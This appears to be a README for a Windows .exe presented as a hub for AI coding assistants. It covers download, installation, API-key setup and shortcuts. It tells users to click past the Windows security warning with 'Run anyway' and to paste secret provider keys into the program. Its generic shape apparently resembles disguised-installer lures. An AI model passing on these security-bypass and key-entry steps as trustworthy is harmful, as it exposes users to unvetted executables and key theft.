# 🤖 zhishu - Manage your AI coding tools easily

[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/willbringyourworstout/zhishu/releases)

zhishu acts as a central control panel for your artificial intelligence coding assistants. It combines tools like Claude Code, Gemini, and Qwen into one interface. This software works on a clean, black display. You switch between different AI models to write code, solve problems, and manage projects. It simplifies how you interact with command-line tools by providing a visual hub for your work.

## 📥 How to download the software

1. Visit the [official releases page](https://github.com/willbringyourworstout/zhishu/releases).
2. Look for the latest version at the top of the list.
3. Find the file ending in `.exe` under the Assets section.
4. Click the file name to start your download.
5. Wait for the download to complete.

## ⚙️ Setting up on Windows

After you download the installation file, follow these steps to set up the terminal:

1. Open your Downloads folder.
2. Double-click the file you just saved.
3. Windows might show a security prompt. Click "More info" and then "Run anyway" if the system asks for permission.
4. Follow the instructions on the screen to install the terminal.
5. Select the destination folder for the program.
6. Check the box to create a shortcut on your desktop.
7. Click Finish to end the installer.

## 🛠️ Requirements

Your computer needs to meet these standards to run the application well:

* Windows 10 or Windows 11.
* A stable internet connection for the AI models to work.
* An active account key for the AI services you choose to use.
* Four gigabytes of available RAM.
* A monitor that supports a resolution of at least 1280 by 720 pixels.

## 🚀 Getting started with sessions

The main screen shows a list of available AI models on the left. Click on a model icon to start a new chat session. You enter your prompts in the text box at the bottom of the screen. The terminal displays the responses from the AI in the main window. You can keep multiple chats open at once. Use the tabs at the top of the window to swap between sessions.

## 📝 Configuring your AI keys

The terminal requires specific access keys to connect to services like Claude, Gemini, or Qwen. You must provide these keys for the software to function:

1. Look for the Settings icon in the bottom corner of the window.
2. Click on the API Keys menu.
3. Locate the field for your provider, such as Anthropic or Google.
4. Paste your secret key into the text field.
5. Click Save to store the key.

Your keys stay on your machine. The software uses these keys only to send requests to the AI services you select.

## 🖥️ Using the interface

The interface uses standard keyboard shortcuts to help you work faster. Press Control and N to create a new tab. Press Control and W to close your current tab. You can resize the terminal window by dragging the corners of the window with your mouse. The dark theme reduces eye strain during long coding sessions.

If the text in the terminal is too small, press Control and the Plus key to zoom in. Use Control and the Minus key to zoom out. This keeps your view comfortable while you manage your projects.

## 🛡️ Privacy and safety

The application facilitates communication between your computer and the AI providers. It keeps your chat history locally on your storage drive. You remain in control of which AI models access your prompts. If you delete a session, the software removes the chat data from your computer. Always keep your API keys private. Never share your keys with others.

## 💡 Troubleshooting common issues

If the terminal fails to start, check the following items:

* Restart your computer to resolve background conflicts.
* Ensure you installed the correct version of the file for your Windows architecture.
* Check if your internet connection allows access to AI service websites.
* Verify that your API keys have credit or funds available.

If the screen stays black but the application is open, try pressing the Refresh button in the top menu bar. This action reloads the interface components.
